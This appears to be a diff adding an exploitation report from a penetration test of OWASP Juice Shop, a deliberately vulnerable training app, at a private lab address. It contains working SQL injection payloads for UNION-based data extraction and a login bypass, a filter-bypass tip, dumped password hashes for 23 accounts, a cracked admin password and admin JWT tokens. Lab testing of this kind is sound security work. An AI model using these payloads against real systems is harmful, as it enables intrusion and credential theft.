@@ -1,0 +1,136 @@
+========================================================
+SQL INJECTION EXPLOITATION RESULTS
+Target: http://10.3.10.10:1234/ (OWASP Juice Shop)
+Date: 2026-03-09
+========================================================
+
+## 1. SQLI TYPE CONFIRMED
+
+- Endpoint: GET /rest/products/search?q=
+- Type: UNION-based (9-column) + Error-based (SQLite)
+- Injection syntax: test')) UNION SELECT ...-- (double-paren closure)
+- DBMS: SQLite
+- Evidence:
+  - `?q=test%27` → HTTP 500: "SQLITE_ERROR: near '%': syntax error"
+  - `?q=test'))%20UNION%20SELECT%20...` → successful data extraction
+  - Juice Shop's WAF/route guard blocks NULL,NULL,NULL patterns but named-column SELECTs bypass it
+
+## 2. DATABASE TABLES FOUND
+
+Tables enumerated via: test')) UNION SELECT sql,name,... FROM sqlite_master WHERE type='table'--
+
+- Addresses
+- BasketItems
+- Baskets
+- Captchas
+- Cards
+- Challenges
+- Complaints
+- Deliveries
+- Feedbacks
+- Hints
+- ImageCaptchas
+- Memories
+- PrivacyRequests
+- Products
+- Quantities
+- Recycles
+- SecurityAnswers
+- SecurityQuestions
+- Users            <-- PRIMARY TARGET
+- Wallets
+- sqlite_sequence
+
+## 3. USERS TABLE SCHEMA
+
+CREATE TABLE `Users` (
+  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
+  `username` VARCHAR(255) DEFAULT '',
+  `email` VARCHAR(255) UNIQUE,
+  `password` VARCHAR(255),
+  `role` VARCHAR(255) DEFAULT 'customer',
+  `deluxeToken` VARCHAR(255) DEFAULT '',
+  `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0',
+  `profileImage` VARCHAR(255),
+  `totpSecret` VARCHAR(255) DEFAULT '',
+  `isActive` TINYINT(1) DEFAULT 1,
+  `createdAt` DATETIME NOT NULL,
+  `updatedAt` DATETIME NOT NULL,
+  `deletedAt` DATETIME
+)
+
+## 4. DUMPED USER RECORDS (23 total)
+
+Payload used:
+  test')) UNION SELECT email,password,role,username,id,createdAt,updatedAt,deletedAt,deluxeToken FROM Users--
+
+ID  | Email                          | Password Hash (MD5)              | Role        | Username
+----|--------------------------------|----------------------------------|-------------|----------
+1   | admin@juice-sh.op              | 0192023a7bbd73250516f069df18b500 | admin       |
+2   | jim@juice-sh.op                | e541ca7ecf72b8d1286474fc613e5e45 | customer    |
+3   | bender@juice-sh.op             | 0c36e517e3fa95aabf1bbffc6744a4ef | customer    |
+4   | bjoern.kimminich@gmail.com     | 6edd9d726cbdc873c539e41ae8757b8c | admin       | bkimminich
+5   | ciso@juice-sh.op               | 861917d5fa5f1172f931dc700d81a8fb | deluxe      |
+6   | support@juice-sh.op            | 3869433d74e3d0c86fd25562f836bc82 | admin       |
+7   | morty@juice-sh.op              | f2f933d0bb0ba057bc8e33b8ebd6d9e8 | customer    |
+8   | mc.safesearch@juice-sh.op      | b03f4b0ba8b458fa0acdc02cdb953bc8 | customer    |
+9   | J12934@juice-sh.op             | 3c2abc04e4a6ea8f1327d0aae3714b7d | admin       |
+10  | wurstbrot@juice-sh.op          | 9ad5b0492bbe528583e128d2a8941de4 | admin       | wurstbrot
+11  | amy@juice-sh.op                | 030f05e45e30710c3ad3c32f00de0473 | customer    |
+12  | bjoern@juice-sh.op             | 7f311911af16fa8f418dd1a3051d6810 | admin       |
+13  | bjoern@owasp.org               | 9283f1b2e9669749081963be0462e466 | deluxe      |
+14  | chris.pike@juice-sh.op         | 10a783b9ed19ea1c67c3a27699f0095b | customer    |
+15  | accountant@juice-sh.op         | 963e10f92a70b4b463220cb4c5d636dc | accounting  |
+16  | uvogin@juice-sh.op             | 05f92148b4b60f7dacd04cceebb8f1af | customer    |
+17  | demo                           | fe01ce2a7fbac8fafaed7c982a04e229 | customer    |
+18  | john@juice-sh.op               | 00479e957b6b42c459ee5746478e4d45 | customer    | j0hNny
+19  | emma@juice-sh.op               | 402f1c4a75e316afec5a6ea63147f739 | customer    | E=ma²
+20  | stan@juice-sh.op               | e9048a3f43dd5e094ef733f3bd88ea64 | deluxe      | SmilinStan
+21  | ethereum@juice-sh.op           | 2c17c6393771ee3048ae34d6b380c5ec | deluxe      | evmrox
+22  | testing@juice-sh.op            | b616a64605a07941fbd31868aea3b54b | admin       |
+23  | attacker@test.com              | f023920d22ad5a90341c4989538a44be | customer    |
+
+## 5. CRACKED PASSWORDS
+
+admin@juice-sh.op → admin123  (MD5 verified: hashlib.md5(b'admin123').hexdigest() == '0192023a7bbd73250516f069df18b500')
+
+## 6. LOGIN BYPASS RESULT
+
+Method: POST /rest/user/login with SQLi payload in email field
+Payload: {"email":"' OR 1=1--","password":"x"}
+Result: SUCCESS - logged in as admin@juice-sh.op (first user in DB, role=admin)
+HTTP Response: 200 OK with JWT token
+
+SQLi Bypass JWT Token:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDMtMDkgMTg6MDg6MzQuODgzICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDMtMDkgMTg6MDg6MzQuODgzICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MzA4MDA4NX0.VdbDsAfI5eZx352OfHmnciIFhURABffedoA0huIDZP9Ztw3oah1wBMEh-pnlZ500qGibG5n2oE6MrxjeuhIhLNjrLB4JEGfrV-XWnOOcsnfDMq4s1OBtBvDBQRp6LrhpD0SZFK9p5JE9wKTByfo1o1i88TXQ0-UzU2sLITQwN8I
+
+## 7. DIRECT ADMIN LOGIN (with cracked credential)
+
+Email: admin@juice-sh.op
+Password: admin123 (cracked from MD5 hash)
+Method: POST /rest/user/login with valid credentials
+Result: SUCCESS
+
+Admin JWT Token:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDMtMDkgMTg6MDg6MzQuODgzICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDMtMDkgMTg6MDg6MzQuODgzICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MzA4MDA5MH0.JAMse9aM2GQhE5yVAYXpMikfHj5VSuWE_UEXw-nQhMsmOCtVRhM_9Xyu-38j6eVl16WuDfN9xjNw6gvKN9ElWdGJpx15uLYso67TblGyQZ0K6wcOIzAEOKIz0RXca4MCYum_vhcFBa0qUxR_8zV1hWOlt6HqEB0uhih3GPpu2WE
+
+## 8. ADMIN ACCOUNTS SUMMARY
+
+Email                       | Password          | Role
+----------------------------|-------------------|-------
+admin@juice-sh.op           | admin123 (CRACKED)| admin
+J12934@juice-sh.op          | unknown (MD5)     | admin
+support@juice-sh.op         | unknown (MD5)     | admin
+bjoern.kimminich@gmail.com  | unknown (MD5)     | admin
+bjoern@juice-sh.op          | unknown (MD5)     | admin
+wurstbrot@juice-sh.op       | unknown (MD5)     | admin
+testing@juice-sh.op         | unknown (MD5)     | admin
+
+## 9. SQLMAP
+
+sqlmap running in background, output dir:
+/Users/bingus/repos/EH_Skills/engagements/10-3-10-10-1234/scans/sqlmap/
+
+========================================================
+END OF REPORT
+========================================================
